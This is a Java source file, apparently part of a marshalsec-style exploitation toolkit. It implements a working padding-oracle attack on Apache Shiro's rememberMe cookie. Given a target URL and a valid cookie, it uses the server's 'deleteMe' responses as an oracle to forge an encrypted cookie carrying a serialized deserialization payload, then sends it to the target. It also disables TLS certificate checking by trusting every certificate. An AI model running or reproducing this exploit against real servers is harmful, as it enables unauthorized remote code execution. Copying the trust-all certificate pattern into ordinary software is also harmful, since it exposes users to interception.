package marshalsec;

import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.Arrays;
import java.util.Base64;
import javax.net.ssl.SSLContext;
import marshalsec.util.PaddingOracleCBCForShiro;
import marshalsec.util.PaddingOracleCBCForShiro.CBCResult;
import org.apache.http.Header;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.ssl.SSLContextBuilder;
import org.apache.http.ssl.TrustStrategy;

/**
 * @author xuanyh
 */
public class ShiroPaddingOracleCBC extends Shiro {

  private String userUrl;
  private String rememberMe;
  private boolean isSsl;
  private SSLConnectionSocketFactory sslsf;

  public ShiroPaddingOracleCBC(String[] args) {
    int argoff = 0;

    while (argoff < args.length && args[argoff].charAt(0) == '-') {
      if (args[argoff].equals("--attack")) {
        argoff++;
        userUrl = args[argoff++];
        rememberMe = args[argoff++];
      } else {
        argoff++;
      }
    }

    if (isSsl = userUrl.startsWith("https")) {
      try {
        SSLContext sslContext = new SSLContextBuilder()
            .loadTrustMaterial(null, new TrustStrategy() {
              // 信任所有
              public boolean isTrusted(X509Certificate[] chain,
                  String authType)
                  throws CertificateException {
                return true;
              }
            }).build();
        sslsf = new SSLConnectionSocketFactory(
            sslContext);
      } catch (Exception e) {
        e.printStackTrace();
      }
    }
  }

  private void attack(byte[] bytes) {
    byte[] originRememberMe = Base64.getDecoder().decode(rememberMe.getBytes());

    CBCResult cbcResult = PaddingOracleCBCForShiro
        .paddingOracleCBC(bytes, data -> {
          try {
            byte[] newRememberMe = new byte[originRememberMe.length + data.length];
            System.arraycopy(originRememberMe, 0, newRememberMe, 0, originRememberMe.length);
            System.arraycopy(data, 0, newRememberMe, originRememberMe.length, data.length);
            return request(newRememberMe);
          } catch (Exception e) {
            e.printStackTrace();
          }
          return false;
        });

    byte[] remenberMe = new byte[cbcResult.getIv().length + cbcResult.getCrypt().length];
    System.arraycopy(cbcResult.getIv(), 0, remenberMe, 0, cbcResult.getIv().length);
    System.arraycopy(cbcResult.getCrypt(), 0, remenberMe, cbcResult.getIv().length,
        cbcResult.getCrypt().length);
    System.out.println("remenberMe=" + Base64.getEncoder().encodeToString(remenberMe));
    request(remenberMe);
  }

  private boolean request(byte[] data) {
    HttpGet httpGet = new HttpGet(userUrl);
    httpGet.addHeader("Cookie", "rememberMe=" + Base64.getEncoder().encodeToString(data));
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
//          .setProxy(new HttpHost("127.0.0.1", 8080))
          .disableRedirectHandling()
          .disableCookieManagement()
          ;
      if (isSsl)
          httpClientBuilder.setSSLSocketFactory(sslsf);

      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpGet);
        Header[] headers = response.getHeaders("Set-Cookie");
        for (int i = 0; i < headers.length; i++) {
          if (headers[i].getValue().contains("rememberMe=deleteMe")) {
            return true;
          }
        }
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
    return false;
  }

  @Override
  public byte[] marshal(Object o) throws Exception {
    byte[] bytes = super.marshal(o);
    attack(bytes);
    return bytes;
  }

  public static void main(String[] args) {
    new ShiroPaddingOracleCBC(args).run(args);
  }
}
